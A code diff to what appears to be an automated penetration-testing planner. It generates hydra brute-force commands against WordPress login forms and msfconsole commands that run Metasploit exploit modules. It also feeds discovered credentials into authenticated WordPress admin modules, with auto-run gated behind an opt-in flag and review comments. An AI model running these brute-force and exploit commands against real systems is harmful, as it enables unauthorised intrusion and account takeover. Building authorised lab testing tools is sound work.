@@ -3,10 +3,19 @@
 from __future__ import annotations
 
 import os
+import shlex
 
 from V5.models import PathStep
 from V5.runtime.allowlist import _is_exploit_family, _normalize_tool
 from V5.runtime.wordlists import resolve_lab_wordlist
+
+CredentialPair = tuple[str, str]
+
+# WordPress failed logins render <div id="login_error">. "Invalid" only appears for
+# unknown users, so F=Invalid treats every wrong password for a valid user as a hit.
+WP_LOGIN_FORM = (
+    '"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:F=login_error"'
+)
 
 # Tools for which we ship a deterministic auto-run template (non-exploit).
 TEMPLATED_AUTORUN_TOOLS: frozenset[str] = frozenset(
@@ -27,7 +36,12 @@ def has_autorun_template(tool: str, *, allow_auto_exploits: bool = False) -> boo
     return normalized in TEMPLATED_AUTORUN_TOOLS
 
 
-def suggest_command(step: PathStep, *, for_auto_exploit: bool = False) -> str:
+def suggest_command(
+    step: PathStep,
+    *,
+    for_auto_exploit: bool = False,
+    credentials: list[CredentialPair] | None = None,
+) -> str:
     tool = _normalize_tool(step.tool)
     ip = step.target_ip
     port = step.port
@@ -59,36 +73,23 @@ def suggest_command(step: PathStep, *, for_auto_exploit: bool = False) -> str:
         passwords = resolve_lab_wordlist("passwords")
         port_flag = f"-s {hydra_port} " if hydra_port else ""
         if hydra_mod in {"http-get", "https-get"}:
-            # Generic WP login form (lab). Bare http-get / does not brute a login.
-            form = (
-                '"/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid"'
-            )
             hydra_mod = "http-post-form" if hydra_mod == "http-get" else "https-post-form"
             return (
-                f"hydra {port_flag}-L {users} -P {passwords} {ip} {hydra_mod} {form} "
-                f"# REVIEW: lab wordlists"
+                f"hydra -I -t 4 {port_flag}-L {users} -P {passwords} {ip} {hydra_mod} "
+                f"{WP_LOGIN_FORM} # REVIEW: lab wordlists"
             )
         return (
-            f"hydra {port_flag}-L {users} -P {passwords} {ip} {hydra_mod} "
+            f"hydra -I -t 4 {port_flag}-L {users} -P {passwords} {ip} {hydra_mod} "
             f"# REVIEW: lab wordlists required; promoted tools only"
         )
 
     if _is_exploit_family(tool) or tool.startswith("exploit/") or "/" in tool:
-        module = step.tool
-        if for_auto_exploit:
-            port_set = f"set RPORT {port}; " if port else ""
-            lhost = os.environ.get("AUTOPLAN_LHOST", "").strip()
-            lhost_set = f"set LHOST {lhost}; " if lhost else ""
-            # SRVHOST/SRVPORT avoid OptionValidateError on HTTP payloads.
-            return (
-                f"msfconsole -q -x 'use {module}; set RHOSTS {ip}; {port_set}"
-                f"{lhost_set}set SRVHOST 0.0.0.0; set SRVPORT 8080; "
-                f"check; run; exit'"
-            )
-        port_txt = f"RPORT={port}" if port else "RPORT=<port>"
-        return (
-            f"msfconsole -q -x 'use {module}; set RHOSTS {ip}; set {port_txt}; "
-            f"check; # run manually after review'"
+        return _msfconsole_command(
+            step.tool,
+            ip,
+            port,
+            for_auto_exploit=for_auto_exploit,
+            credentials=credentials,
         )
 
     if tool in {"john", "hashcat"}:
@@ -136,20 +137,64 @@ def _hydra_port(step: PathStep, hydra_mod: str) -> int | None:
     return step.port
 
 
-def compile_autorun_command(step: PathStep, *, allow_auto_exploits: bool = False) -> str | None:
+def compile_autorun_command(
+    step: PathStep,
+    *,
+    allow_auto_exploits: bool = False,
+    credentials: list[CredentialPair] | None = None,
+) -> str | None:
     """Return an executable command string, or None if not auto-runnable."""
 
     tool = _normalize_tool(step.tool)
     if _is_exploit_family(tool):
         if not allow_auto_exploits:
             return None
-        return suggest_command(step, for_auto_exploit=True)
+        return suggest_command(step, for_auto_exploit=True, credentials=credentials)
 
     if not has_autorun_template(step.tool, allow_auto_exploits=allow_auto_exploits):
         return None
-    suggested = suggest_command(step)
+    suggested = suggest_command(step, credentials=credentials)
     # Strip review comments for execution
     command = suggested.split("#", 1)[0].strip()
     if not command:
         return None
     return command
+
+
+def module_needs_login_credentials(tool: str) -> bool:
+    """True when the MSF module requires USERNAME/PASSWORD (authenticated WP admin)."""
+    lowered = tool.lower()
+    return "wp_admin" in lowered or "wordpress_admin" in lowered
+
+
+def _msfconsole_command(
+    module: str,
+    ip: str,
+    port: int | None,
+    *,
+    for_auto_exploit: bool,
+    credentials: list[CredentialPair] | None,
+) -> str:
+    statements = [f"use {module}", f"set RHOSTS {ip}"]
+    if port:
+        statements.append(f"set RPORT {port}")
+    lhost = os.environ.get("AUTOPLAN_LHOST", "").strip()
+    if lhost:
+        statements.append(f"set LHOST {lhost}")
+    if credentials and module_needs_login_credentials(module):
+        username, password = credentials[0]
+        statements.append(f"set USERNAME {_msf_literal(username)}")
+        statements.append(f"set PASSWORD {_msf_literal(password)}")
+    statements.append("check")
+    if for_auto_exploit:
+        statements.append("run")
+        statements.append("exit")
+    script = "; ".join(statements)
+    if for_auto_exploit:
+        return f"msfconsole -q -x {shlex.quote(script)}"
+    return f"msfconsole -q -x {shlex.quote(script)} # run manually after review"
+
+
+def _msf_literal(value: str) -> str:
+    """Keep MSF set-values from breaking the -x script."""
+    return "".join(ch for ch in value if ch not in ";\n\r")
